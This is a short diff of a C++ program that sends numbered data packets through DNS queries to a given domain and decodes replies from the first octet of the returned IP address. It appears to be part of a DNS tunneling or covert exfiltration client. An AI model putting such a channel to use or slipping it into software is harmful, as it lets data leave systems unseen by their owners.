@@ -55,7 +55,6 @@ int main(int argc, char* argv[]) {
 		case ERROR_ALREADY_EXISTS:  // program already running
 			return TRUE;
 		case ERROR_SUCCESS:  // program isn't already running
-			break;
 		default:  // start just to be sure.
 			break;
 	}
@@ -145,13 +144,30 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 								   &pDnsRecord,
 								   NULL);
 	
-	// retry 5 times
+	// retry 5 times, then give up this message
 	for (int i = 0; i < 5; i++) {
 		if (!status) {
 			IN_ADDR ipaddr;
 			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
-			std::cout << "IP: " << inet_ntoa(ipaddr) << std::endl;
+			std::string ipStr = inet_ntoa(ipaddr);
 			DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
+			
+			int code = std::stoi(ipStr.substr(0, ipStr.find(".")));
+			std::cout << "Response Code: " << code << std::endl;
+			switch (code) {
+				case 200:
+					break;
+				case 201:
+					break;
+				case 202:
+					break;
+				case 203:
+					break;
+				case 204:
+					break;
+				default:  // unknown error
+					break;
+			}
 			return 0;  // do checks for the actual response code.
 		}
 	}
